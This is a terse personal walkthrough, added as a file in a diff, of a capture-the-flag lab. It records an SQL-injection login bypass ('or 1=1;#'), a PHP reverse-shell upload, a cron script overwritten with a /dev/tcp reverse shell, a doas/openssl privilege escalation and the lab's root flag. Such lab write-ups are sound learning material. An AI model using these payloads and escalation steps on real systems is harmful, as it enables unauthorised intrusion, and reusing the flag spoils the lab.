@@ -1,0 +1,119 @@
+nmap :
+port 80+445
+
+
+dirb :
+:80
+  shadow, passwd, admin ---> rabbit holes
+:445
+  /management
+
+
+/management ---> redirect ----> /management/
+ 
+
+
+/management/index.html --->
+login ---->
+
+
+' or 1=1;#
+---> redirect --->
+/management/admin/
+
+
+/management/admin/index.html --->
+drivers list --->
+management/admin/?page=drivers/manage_driver
+---->
+upload picture >:)
+---->
+nano r.php ---> pentest-monkey php code
+---->
+fill all data + save 
+---->
+nc -lvnp 1234
+---->
+click eye logo + right click photo 
+---> 
+rev shell :D
+
+
+
+
+
+
+ls /home/plot_admin ---> cat user.txt ---> no permissions
+
+find / -user plot_admin 2>/dev/null
+/var/www/scripts/backup.sh 
+
+ls -l backup.sh 
+-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh
+
+whoami
+www-data
+
+cat /etc/crontab
+* *     * * *   plot_admin /var/www/scripts/backup.sh ---> each minute
+
+i coulden`t figure that one out since i knew changing 
+backup.sh was the correct way but i didn`t have the
+write permissions to the file. so i looked at a walk-
+-through :( ...
+
+
+ls -l /var/www/
+drwxr-xr-x 4 root     root     4096 Oct 28  2021 html
+drwxr-xr-x 2 www-data www-data 4096 Oct 28  2021 scripts
+
+the permissions (& owner) for the scripts folder where
+backup.sh was belongs to the user www-data but the file
+backup.sh belongs to plot_admin. since www the owner of
+the folder scripts www does own the permission to change
+& delete the file but not change the content. :/
+
+rm backup.sh ---> protected blabla ---> yes
+nano backup.sh
+#!/bin/bash
+sh -i >& /dev/tcp/127.0.0.1/5678 0>&1
+
+chmod +x backup.sh
+nc -lvnp 5678 --->
+whoami ----> plot admin :D
+
+
+
+
+
+
+
+
+find / -perm /4000 2>/dev/null
+/usr/bin/doas
+
+cat /etc/doas.conf 
+permit nopass plot_admin as root cmd openssl
+
+---> gtfobins ---> openssl
+tried reverse shell method 
+---> didnt raise privileges
+tried file read
+---> 
+doas openssl enc -in "/root/root.txt"
+--->
+Congratulations on completing this room!
+
+53f85e2da3e874426fa059040a9bdcab
+
+Hope you enjoyed the journey!
+
+Do let me know if you have any ideas/suggestions for future rooms.
+-sa.infinity8888
+
+
+
+
+
+
+
